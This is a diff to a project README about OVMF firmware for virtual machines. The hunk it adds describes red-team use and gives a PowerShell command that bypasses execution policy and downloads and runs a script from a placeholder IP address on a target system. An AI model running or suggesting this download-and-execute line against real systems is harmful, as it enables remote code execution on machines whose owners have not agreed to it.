@@ -21,3 +21,10 @@ If you do go the virtual machine route, you will need the proper firmware - Open
 
 Check out http://www.tianocore.org/ovmf/ for more info and (https://sourceforge.net/projects/edk2/files/OVMF/ or https://github.com/BlankOn/ovmf-blobs) to download.
 
+## Utilizing in red-team environment
+
+simple use
+```
+powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<ip>/api/goose')"
+```
+Run on target system
